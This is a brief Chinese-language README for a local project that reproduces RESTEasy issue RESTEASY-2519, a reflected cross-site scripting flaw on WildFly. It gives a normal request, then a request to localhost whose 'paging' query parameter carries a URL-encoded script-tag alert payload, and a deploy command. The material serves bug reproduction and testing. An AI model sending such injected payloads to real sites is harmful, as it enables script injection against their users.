相关issue：

> https://issues.redhat.com/browse/RESTEASY-2519

正常访问：

```bash
$ http "localhost:8080/resteasy-xss-wildfly/rest/users?paging=1"
```

访问有问题的服务：

```bash
$ http "http://localhost:8080/resteasy-xss-wildfly/rest/users?paging=0%2c-1sp137%3Cscript%3Ealert(1)%3C%2fscript%3Emzx4u"
```

部署：

```bash
[standalone@localhost:9990 /] deploy resteasy-xss-wildfly/target/resteasy-xss-wildfly.war --force
```

